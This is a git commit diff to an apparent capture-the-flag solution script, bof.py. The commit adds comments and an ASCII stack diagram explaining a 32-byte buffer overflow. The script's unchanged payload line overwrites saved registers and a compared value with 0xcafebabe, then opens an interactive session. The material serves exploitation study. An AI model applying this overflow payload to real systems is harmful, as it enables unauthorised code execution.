6d65ef43166c0e48fd367746c168d428b4fb2b08
abdullahalshubaili <a.abunasser.1992@gmail.com>
2020-06-04 03:47:11 +0300

    explaining

--- bof.py
+++ bof.py
@@ -5,8 +5,18 @@ print(run.recv(timeout = 0))
 # reading the code bof.c we see that there is a buffer has been set to a 32 bytes. then a compare operation
 # by running objdump -D bof
 # we can see that func is allocated with 0x2c=44 of memory
-# Bs to fill BasePointer
-# Cs to fill InstructionPointer
-# CAFEBABE is the acting as a canary
+# Bs to fill BasePointer ebp || rbp
+# Cs to fill InstructionPointer eip || rip
+# CAFEBABE is acting as a CANARY
+# lets draw it
+#                   objdump -D bof
+#  -------------
+# |___cafebabe__|   cmp   '''$0xcafebabe''',0x8(%ebp)
+# |___eip__CCCC_|   call   650 <func+0x24>
+# |___ebp__BBBB_|   mov   %eax,(%esp)
+# |   0x2c      |   leav   -0x2c(%ebp),%eax
+# |AAAAAAAAAAAAA|
+# |AAAAAAAAAAAAA|
+#  -------------
 run.sendline('A' * 0x2c +'B'*4 + 'C'*4 + '\xbe\xba\xfe\xca')
 run.interactive()
